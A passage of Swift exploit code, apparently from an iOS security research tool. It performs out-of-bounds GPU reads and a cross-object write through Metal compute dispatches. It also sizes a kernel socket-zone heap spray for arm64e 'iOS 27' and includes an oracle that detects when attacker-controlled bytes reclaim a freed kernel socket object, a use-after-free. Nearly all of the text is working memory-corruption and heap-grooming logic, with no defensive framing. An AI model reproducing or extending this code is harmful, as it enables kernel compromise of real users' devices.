            enc.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1),
                               threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            enc.endEncoding()
            cb.commit()
            cb.waitUntilCompleted()
            return cb.status == .completed
        }

        // ---- 5. sanity + OOB read ------------------------------------------
        emit("READ idx=0x0 -> 0x\(String(readAt(0), radix: 16))")
        emit("READ idx=0x8000 (out of the 0x\(String(alloc, radix: 16)) buffer) -> 0x\(String(readAt(0x8000), radix: 16))")

        // ---- 6. the cross-object write -------------------------------------
        let delta = Int64(ctrl.gpuAddress) - Int64(f1buf.gpuAddress)
        emit("delta = 0x\(String(delta, radix: 16))")
        if delta > 0 {
            // mark the control buffer so we can see our write land
            let marker: UInt32 = 0x43434343
            let st = writeAt(UInt32(delta), marker)
            emit("WRITE at +0x\(String(delta, radix: 16)) status=\(st ? "completed" : "error")")
            let cp = ctrl.contents().assumingMemoryBound(to: UInt32.self)
            var hit = -1
            for i in 0..<(alloc / 4) where cp[i] == marker { hit = i; break }
            emit("CPU view of the control buffer: hit=\(hit) word0=0x\(String(cp[0], radix: 16))")
            // read it back through the GPU (the CPU view of shared memory can
            // be stale)
            let g0 = readAt(0, ctrl)
            let g1 = readAt(4, ctrl)
            emit("GPU view of the control buffer: word0=0x\(String(g0, radix: 16)) word1=0x\(String(g1, radix: 16))")
            if g0 == marker || g1 == marker {
                emit("*** CROSS-OBJECT HIT: the control buffer holds our marker ***")
            } else {
                emit("no marker in the control buffer (GPU view)")
            }
            // restore
            _ = writeAt(UInt32(delta), 0)
        } else {
            emit("delta <= 0: the control buffer is below the F1 buffer; trying the other direction")
            let marker: UInt32 = 0x43434343
            let st = writeAt(UInt32(Int64(UInt32(0)) - delta), marker)
            emit("WRITE at -0x\(String(-delta, radix: 16)) status=\(st ? "completed" : "error")")
            let cp = ctrl.contents().assumingMemoryBound(to: UInt32.self)
            var hit = -1
            for i in 0..<(alloc / 4) where cp[i] == marker { hit = i; break }
            emit(hit >= 0 ? "*** CROSS-OBJECT HIT (word \(hit)) ***" : "no hit")
            _ = writeAt(UInt32(Int64(UInt32(0)) - delta), 0)
        }
    }
}

// Socket-zone reclaim spray payload size (file scope so the nonisolated race
// loops can call it). sizeof(struct socket) on arm64e iOS 27 is ~832 bytes;
// the earlier hard-coded 4096 sprayed the wrong size class entirely, so the
// attacker bytes never competed for a freed socket slot.
// Override with `--spraysize=<bytes>` to sweep candidate sizes empirically.
private func oolSpraySize() -> Int {
    let a = ProcessInfo.processInfo.arguments
    if let i = a.firstIndex(of: "--spraysize"), i + 1 < a.count,
       let v = Int(a[i + 1]), v > 0, v <= 1 << 20 {
        return v
    }
    for arg in a where arg.hasPrefix("--spraysize=") {
        if let v = Int(arg.dropFirst("--spraysize=".count)), v > 0, v <= 1 << 20 {
            return v
        }
    }
    return 832
}

// Fill-detection oracle for the cross-zone reclaim variants.
// After spraying attacker bytes into freed pages, allocate fresh sockets and read
// back their buffer limits. If a value comes back as the fill pattern, our data
// landed in a kernel socket object — i.e. the cross-zone reclaim worked.
private func sockUafFillProbe() -> Int {
    var hits = 0
    var fds: [Int32] = []
    for _ in 0..<8 {
        let f = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        if f >= 0 { fds.append(f) }
    }
    for f in fds {
        var v: Int32 = 0
        var l = socklen_t(MemoryLayout<Int32>.size)
        if getsockopt(f, SOL_SOCKET, SO_SNDBUF, &v, &l) == 0 && v == 0x41414141 { hits += 1 }
        v = 0
        if getsockopt(f, SOL_SOCKET, SO_RCVBUF, &v, &l) == 0 && v == 0x41414141 { hits += 1 }
        close(f)
    }
    return hits
}
